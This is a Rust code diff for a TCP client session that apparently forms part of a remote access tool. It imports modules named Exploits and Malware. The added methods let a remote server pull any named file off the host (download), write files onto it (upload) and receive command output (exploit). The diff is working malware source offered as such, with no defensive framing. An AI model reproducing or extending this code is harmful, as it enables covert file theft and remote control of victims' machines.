@@ -1,9 +1,12 @@
+use crate::exploit::{Exploits, Malware};
 use crate::structure::{
     Detector, Generator, StructRawStonePayload, StructStone, StructStoneHeader, StructStonePayload,
 };
+use bstr::ByteSlice;
+use std::fs::File;
 use std::io::{Read, Write};
 use std::net::TcpStream;
-use std::u8;
+use std::{env, u8};
 
 #[derive(Debug)]
 pub struct Session {
@@ -33,7 +36,9 @@ pub trait Client {
     fn disconnect(&mut self);
     fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
     fn receiving(&mut self, buffer: StructStone) -> StructStone;
-    fn recv_file();
+    fn download(&mut self, stone: StructStone) -> bool;
+    fn upload(&mut self, stone: StructStone) -> bool;
+    fn exploit(&mut self, exploit: Vec<u8>) -> bool;
 }
 
 impl Client for Session {
@@ -44,8 +49,7 @@ impl Client for Session {
     }
 
     fn send_msg(&mut self, msg: &str) {
-        let packet = StructRawStonePayload::new("", msg, "").to_stone();
-        self.send(packet.stone);
+        self.send(StructStone::response(msg).stone);
     }
 
     fn disconnect(&mut self) {
@@ -80,5 +84,76 @@ impl Client for Session {
         return self.receiving(StructStone::from(header, payload)); // 새로운 헤더를 재귀함수로 입력함 이 경우 재귀함수에서 if buffer.header.stone_size != vec![12,0,0,0] 문에 걸려서 페이로드를 수신받게 됨
     }
 
-    fn recv_file() {}
+    fn download(&mut self, stone: StructStone) -> bool {
+        let path = match String::from_utf8(stone.get_file()) {
+            Ok(ok) => ok,
+            Err(_) => {
+                self.send_msg("File Not Found");
+                return false;
+            }
+        };
+
+        let mut open_file = match File::open(path.replace("\\", "/")) {
+            Ok(file) => file,
+            Err(_) => {
+                self.send_msg("File Not Found");
+                return false;
+            }
+        };
+        let mut file = vec![];
+
+        match open_file.read_to_end(&mut file) {
+            Ok(ok) => ok.to_le_bytes().to_vec(),
+            Err(_) => {
+                self.send_msg("File Not Found");
+                return false;
+            }
+        };
+
+        self.send(StructStone::download(file).stone);
+
+        true
+    }
+    fn upload(&mut self, stone: StructStone) -> bool {
+        let file_arr: &[u8] = &stone.get_file()[..];
+        let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();
+
+        let path = format!(
+            "{:?}/{:?}",
+            env::current_dir().unwrap(),
+            String::from_utf8(Vec::from(fields[0])).unwrap()
+        )
+        .replace('"', "")
+        .replace("\\", "/");
+
+        let mut open_file = match File::create(path.clone()) {
+            Ok(ok) => ok,
+            Err(_) => {
+                self.send_msg("File Not Found");
+                return false;
+            }
+        };
+
+        let file = match open_file.write_all(&mut fields[1]) {
+            Ok(_) => format!("File {:?} upload successful", path)
+                .as_bytes()
+                .to_vec(),
+            Err(_) => {
+                self.send_msg("File Not Found");
+                return false;
+            }
+        };
+
+        self.send(StructStone::upload(file).stone);
+
+        true
+    }
+
+    fn exploit(&mut self, output: Vec<u8>) -> bool {
+        let pecket = StructStone::exploit(output).stone;
+        println!("{:?}", pecket);
+        self.send(pecket);
+
+        true
+    }
 }
